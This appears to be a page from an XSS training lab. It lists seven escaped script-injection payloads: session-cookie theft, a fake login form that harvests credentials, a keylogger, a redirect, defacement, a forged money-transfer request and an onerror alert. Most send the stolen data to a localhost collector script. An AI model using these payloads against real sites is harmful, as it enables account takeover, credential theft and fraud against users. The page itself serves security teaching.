<?php
// xss/attacks.php - XSS Attack Demonstration
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Attack Lab</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #f5f7fb;
            color: #1e293b;
            padding: 32px 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }

        .container {
            max-width: 1100px;
            width: 100%;
            background: #ffffff;
            padding: 40px 48px;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.06);
        }

        h1 {
            font-size: 2rem;
            font-weight: 700;
            color: #0f172a;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        h1 i {
            color: #ef4444;
        }

        .vuln-badge {
            display: inline-block;
            background: #ef4444;
            color: #fff;
            font-size: 0.7rem;
            font-weight: 600;
            padding: 4px 16px;
            border-radius: 100px;
            text-transform: uppercase;
            letter-spacing: 0.3px;
            margin: 6px 0 12px 0;
        }

        .warning-box {
            background: #fef2f2;
            border: 1px solid #fecaca;
            color: #991b1b;
            padding: 14px 18px;
            border-radius: 14px;
            font-weight: 500;
            margin: 16px 0 24px 0;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .warning-box i {
            font-size: 1.2rem;
            color: #dc2626;
        }

        .info-box {
            background: #eef2ff;
            border: 1px solid #c7d2fe;
            color: #3730a3;
            padding: 12px 18px;
            border-radius: 12px;
            font-size: 0.9rem;
            margin-bottom: 28px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .info-box i {
            color: #4f46e5;
        }

        .attack-box {
            background: #f8fafc;
            border: 1px solid #e9edf2;
            border-radius: 18px;
            padding: 24px 28px;
            margin-bottom: 24px;
            transition: 0.2s ease;
        }

        .attack-box:hover {
            border-color: #cbd5e1;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
        }

        .attack-box h3 {
            font-size: 1.2rem;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .attack-box h3 i {
            color: #ef4444;
        }

        .attack-box p {
            color: #475569;
            font-size: 0.95rem;
            margin-bottom: 8px;
        }

        .payload-box {
            background: #f1f5f9;
            padding: 12px 16px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            color: #0f172a;
            border-left: 4px solid #ef4444;
            word-break: break-all;
            margin: 6px 0 10px 0;
        }

        .payload-box strong {
            color: #0f172a;
        }

        .back {
            display: inline-block;
            margin-top: 20px;
            color: #4f46e5;
            font-weight: 500;
            text-decoration: none;
        }

        .back:hover {
            text-decoration: underline;
        }

        .footer-note {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e9edf2;
            color: #94a3b8;
            font-size: 0.85rem;
        }

        .inline-code {
            background: #f1f5f9;
            padding: 2px 10px;
            border-radius: 6px;
            font-family: monospace;
            font-size: 0.85rem;
            color: #0f172a;
        }

        .tag {
            font-size: 0.6rem;
            font-weight: 600;
            padding: 2px 10px;
            border-radius: 100px;
            background: #f1f5f9;
            color: #475569;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        @media (max-width: 640px) {
            .container { padding: 24px 16px; }
            .attack-box { padding: 18px 16px; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1><i class="fas fa-skull"></i> XSS Attack Lab</h1>
    <div class="vuln-badge">VULNERABLE</div>

    <div class="warning-box">
        <i class="fas fa-triangle-exclamation"></i>
        <span><strong>WARNING:</strong> This page demonstrates <strong>REAL XSS attacks</strong>. Use only in your lab!</span>
    </div>

    <div class="info-box">
        <i class="fas fa-info-circle"></i>
        <span>💡 Check <strong>stolen_data.txt</strong> in your project folder to see captured data.</span>
    </div>

    <!-- Attack 1 -->
    <div class="attack-box">
        <h3><i class="fas fa-cookie"></i> Attack 1: Session Hijacking (Steal Cookies)</h3>
        <p>Steals the user's session cookie and sends it to the attacker.</p>
        <p><strong>Payload:</strong></p>
        <div class="payload-box">
            &lt;script&gt;fetch('http://localhost:8000/steal.php?cookie=' + document.cookie);&lt;/script&gt;
        </div>
        <p><strong>URL:</strong></p>
        <div class="payload-box">
            http://localhost:8000/xss/reflected.php?q=&lt;script&gt;fetch('http://localhost:8000/steal.php?cookie='+document.cookie);&lt;/script&gt;
        </div>
    </div>

    <!-- Attack 2 -->
    <div class="attack-box">
        <h3><i class="fas fa-fish"></i> Attack 2: Phishing (Fake Login Form)</h3>
        <p>Shows a fake login form that sends credentials to the attacker.</p>
        <p><strong>Payload:</strong></p>
        <div class="payload-box">
            &lt;script&gt;document.body.innerHTML = '&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;color:black;padding:50px;"&gt;&lt;h2&gt;Session Expired&lt;/h2&gt;&lt;form action="http://localhost:8000/steal.php" method="POST"&gt;Username: &lt;input name="user"&gt;&lt;br&gt;Password: &lt;input name="pass" type="password"&gt;&lt;br&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;';&lt;/script&gt;
        </div>
    </div>

    <!-- Attack 3 -->
    <div class="attack-box">
        <h3><i class="fas fa-arrow-right"></i> Attack 3: Redirect to Malware</h3>
        <p>Redirects the user to a malicious site.</p>
        <p><strong>Payload:</strong></p>
        <div class="payload-box">
            &lt;script&gt;window.location = 'https://example.com';&lt;/script&gt;
        </div>
    </div>

    <!-- Attack 4 -->
    <div class="attack-box">
        <h3><i class="fas fa-keyboard"></i> Attack 4: Keylogging</h3>
        <p>Records every keystroke the user types.</p>
        <p><strong>Payload:</strong></p>
        <div class="payload-box">
            &lt;script&gt;document.addEventListener('keydown', function(e) { fetch('http://localhost:8000/steal.php?key=' + e.key); });&lt;/script&gt;
        </div>
    </div>

    <!-- Attack 5 -->
    <div class="attack-box">
        <h3><i class="fas fa-paint-brush"></i> Attack 5: Defacement</h3>
        <p>Changes the page content.</p>
        <p><strong>Payload:</strong></p>
        <div class="payload-box">
            &lt;script&gt;document.body.innerHTML = '&lt;h1 style="color:red;text-align:center;font-size:100px;"&gt;HACKED!&lt;/h1&gt;&lt;p style="text-align:center;"&gt;This site is compromised.&lt;/p&gt;';&lt;/script&gt;
        </div>
    </div>

    <!-- Attack 6 -->
    <div class="attack-box">
        <h3><i class="fas fa-shield-halved"></i> Attack 6: CSRF Bypass</h3>
        <p>Performs actions on behalf of the user (e.g., transfer money).</p>
        <p><strong>Payload:</strong></p>
        <div class="payload-box">
            &lt;script&gt;fetch('http://localhost:8000/csrf/transfer.php', { method: 'POST', body: 'to=hacker&amount=1000' });&lt;/script&gt;
        </div>
    </div>

    <!-- Attack 7 -->
    <div class="attack-box">
        <h3><i class="fas fa-code"></i> Attack 7: DOM-based XSS</h3>
        <p>Executes JavaScript via DOM manipulation.</p>
        <p><strong>Payload:</strong></p>
        <div class="payload-box">
            &lt;img src=x onerror="alert('DOM XSS')"&gt;
        </div>
    </div>

    <!-- Back Link -->
    <a href="../index.php" class="back"><i class="fas fa-arrow-left"></i> Back to Home</a>

    <div class="footer-note">
        🔐 Educational use only — all vulnerabilities are intentional.
    </div>
</div>
</body>
</html>